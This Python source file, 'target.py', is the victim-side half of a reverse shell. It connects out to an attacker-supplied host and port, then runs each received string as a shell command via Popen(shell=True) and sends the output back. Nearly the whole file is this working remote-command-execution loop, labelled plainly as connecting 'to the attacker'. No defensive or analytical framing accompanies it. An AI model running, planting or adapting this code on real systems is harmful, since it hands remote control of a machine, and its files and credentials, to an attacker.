# ========================================================================
# $File: target.py $
# $Date: 2019-01-21 23:03:50 $
# $Revision: $
# $Creator: Jen-Chieh Shen $
# $Notice: See LICENSE.txt for modification and distribution information
#                   Copyright © 2019 by Shen, Jen-Chieh $
# ========================================================================

import socket
import sys
import os
import locale
from subprocess import *

import command


HOST = '127.0.0.1'  # Symbolic name meaning all available interfaces
PORT = 50007        # Arbitrary non-privileged port

BUF_SIZE = 1024

ENCODE_TYPE = 'utf-8'
DECODE_TYPE = 'utf-8'

DEFAULT_LOCALE = []


def main():
    """Program Entry point."""

    DEFAULT_LOCALE = locale.getdefaultlocale()[1]

    # Resolve arguments.
    arg_len = len(sys.argv)

    if 2 <= arg_len:
        host = sys.argv[1]
    else:
        host = HOST

    if 3 <= arg_len:
        port = int(sys.argv[2])
    else:
        port = PORT

    print("Connecting to the Reverse Shell server...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print(f"Connecting to the attacker : {host}:{port}")
        s.connect((host, port))

        while True:
            # Send the path.
            path = os.path.dirname(os.path.abspath(__file__))
            s.sendall(path.encode(ENCODE_TYPE))

            # Receive it.
            data = s.recv(BUF_SIZE)
            if not data:
                break

            in_cmd = data.decode(DECODE_TYPE)
            print("Received: ", str(data));

            if in_cmd == command.Command.SHUTDOWN.value:
                break

            cd_path = in_cmd.split(" ")

            if "cd" in in_cmd:
                cd_param = cd_path[1]
                if ".." in cd_param:
                    os.chdir("..")
                elif os.path.isdir(cd_param):
                    os.chdir(cd_param)
                continue

            # Execute shell command.
            proc = Popen(in_cmd, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
            outs, errs = proc.communicate()

            output = "** Default output command... **".encode(ENCODE_TYPE)

            if outs:
                output = outs
            if errs:
                output = errs

            # Send results
            s.sendall(output)

        print("Cleaning the socket buffer...")
        s.shutdown(socket.SHUT_RDWR)
        s.close()

if __name__ == "__main__":
    main()
